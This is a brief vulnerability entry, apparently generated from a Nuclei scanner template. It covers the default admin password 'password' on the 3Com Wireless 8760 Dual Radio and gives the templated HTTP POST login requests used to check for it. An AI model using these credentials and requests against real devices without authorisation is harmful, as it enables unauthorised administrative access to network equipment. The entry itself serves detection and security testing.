# Vulnerability: 3Com Wireless 8760 Dual Radio - Default Login
**Classification:** DEFAULT-LOGIN
**Source:** Nuclei Template (`3Com-wireless-default-login.yaml`)

## Description
3COM Wireless 8760 Dual Radio contains a default login vulnerability. Default admin login password 'password' was found.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /index.htm HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

userid={{username}}&passwd={{password}}&Submit=LOGIN

POST /login.html HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}
```

